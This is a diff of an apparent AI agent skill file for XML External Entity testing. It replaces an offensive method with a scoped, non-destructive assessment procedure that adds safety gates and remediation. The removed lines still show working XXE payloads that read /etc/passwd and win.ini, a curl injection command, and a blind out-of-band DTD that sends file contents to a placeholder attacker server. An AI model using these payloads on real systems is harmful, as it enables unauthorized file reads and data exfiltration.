@@ -1,144 +1,69 @@
 ---
 name: attack-xxe
-description: "XML External Entity injection — file read, SSRF, data exfiltration via out-of-band XML parsing"
+description: "Assess XML parser external-entity handling with harmless local markers and approved callbacks"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - xxe
-  - xml
-  - injection
-  - web
-  - attack
-tech_stack:
-  - web
-  - java
-  - php
-  - dotnet
-cwe_ids:
-  - CWE-611
-  - CWE-827
-chains_with:
-  - attack-ssrf
-prerequisites: []
-severity_boost:
-  attack-ssrf: "XXE + SSRF = internal network access via XML parser"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [xxe, xml, parser, entity-resolution, ssrf]
+tech_stack: [xml, http, api, java, php, dotnet]
+cwe_ids: [CWE-611]
+chains_with: [attack-ssrf, attack-triage-validation]
+prerequisites:
+  - "Authorized XML-consuming endpoint and approved test scope"
+  - "A non-sensitive marker or program-approved callback service"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-xxe/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
+  - "https://owasp.org/www-project-web-security-testing-guide/"
 ---
 
-# XML External Entity (XXE) Injection
+# XML External Entity (XXE) Assessment
 
 ## Objective
 
-Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.
+Determine whether an XML parser processes attacker-controlled external entities or unsafe document types, potentially causing unauthorized file access, server-side requests, or denial of service. Use non-destructive validation only.
 
-## Testing Methodology
+## Safety gates
 
-### Phase 1: Identify XML Processing
+Prefer a lab or staging environment. Do not read operating-system files, cloud metadata, internal services, or secrets from production. Do not use recursive entity expansion, oversized documents, or payloads designed to exhaust memory/CPU. Out-of-band testing must use an approved callback and unique non-sensitive marker.
 
-Look for endpoints accepting:
-- `Content-Type: application/xml` or `text/xml`
-- SOAP endpoints (`.asmx`, `.wsdl`)
-- File upload accepting SVG, DOCX, XLSX
-- RSS/Atom feed processing
-- SAML authentication
+## Procedure
 
-### Phase 2: In-Band XXE (File Read)
+### 1. Identify XML parsing surfaces
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>&xxe;</root>
-```
+Review XML uploads, SOAP endpoints, SAML/XML integrations, document conversion, SVG processing, feed import, and API content types. Confirm the server actually parses XML rather than treating it as opaque text.
 
-**Windows targets:**
-```xml
-<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
-```
+### 2. Establish baseline
 
-### Phase 3: Blind XXE (Out-of-Band)
+Send a valid minimal XML document with a harmless marker. Record response behavior, parser errors, content type, and whether processing is synchronous or asynchronous.
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
-  %xxe;
-]>
-<root>test</root>
-```
+### 3. Test DOCTYPE and entity behavior safely
 
-**Hosted DTD (xxe.dtd):**
-```xml
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
-%eval;
-%exfil;
-```
+In an authorized test environment, use a benign internal entity that expands to a fixed text marker. Check whether DTD processing is enabled and whether the marker appears in a predictable output. Avoid external file entities and recursive expansion on production.
 
-Use the SSRF listener for callback detection:
-```bash
-attack_script ssrf_listener -p 8888 -o xxe_hits.json
-```
+### 4. Check external resolution only when permitted
 
-### Phase 4: XXE via File Upload
+If the program explicitly allows OOB testing, reference a unique token on a controlled callback domain and observe whether the server resolves or requests it. Do not send sensitive content to the callback or attempt to retrieve internal files. A callback proves external resolution, not necessarily file disclosure.
 
-**SVG:**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
-</svg>
-```
+### 5. Separate impact classes
 
-**DOCX:** Modify `[Content_Types].xml` or `word/document.xml` inside the ZIP.
+- Entity expansion visible in the response is in-band behavior.
+- A controlled callback indicates out-of-band resolution.
+- SSRF is a separate downstream impact and should be validated under `attack-ssrf` within the approved scope.
+- File read or denial-of-service claims require separate, safe evidence and must not be tested destructively on production.
 
-### Phase 5: Content-Type Manipulation
+### 6. Remediation and cleanup
 
-```bash
-# Switch JSON endpoint to XML
-curl -X POST https://TARGET/api/data \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
-```
+Recommend disabling external general/parameter entities and DTD processing when not required, using secure parser defaults, patching parser libraries, and limiting document size/depth. Remove test files and callback records if permitted.
 
-### Phase 6: Parameter Entity Injection
+## Common false positives
 
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
-  %a;
-]>
-<root>&xxe;</root>
-```
+- The application echoes the XML without parsing it.
+- A parser error mentions DTDs but no entity is resolved.
+- The callback comes from a scanner or browser rather than the target server.
+- The service normalizes XML or disables external resolution.
+- A suspected file-read payload was never safely validated.
 
-## What Constitutes a Finding
+## Output contract
 
-| Finding | Severity |
-|---------|----------|
-| File contents read (e.g., /etc/passwd) | Critical (P1) |
-| Out-of-band DNS/HTTP callback | High (P2) |
-| SSRF via XXE | High (P2) |
-| Denial of Service (billion laughs) | Medium (P3) |
-| Error-based file path disclosure | Low (P4) |
-
-## Evidence Requirements
-
-- XML payload sent
-- Response containing file contents or error
-- For blind XXE: OOB interaction evidence (DNS/HTTP callback)
-- Server type and parser identified
-
-## Tools
-
-- `attack_script ssrf_listener` — OOB callback listener for blind XXE
-- `attack_script file_upload_tester` — SVG XXE via upload
-
-## References
-
-- [PortSwigger: XXE](https://portswigger.net/web-security/xxe)
-- [OWASP: XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+Return `xml_surface`, `parser_evidence`, `doctype_behavior`, `external_resolution`, `callback_evidence`, `impact_class`, `environment`, `cleanup_status`, `confidence`, and redacted evidence.
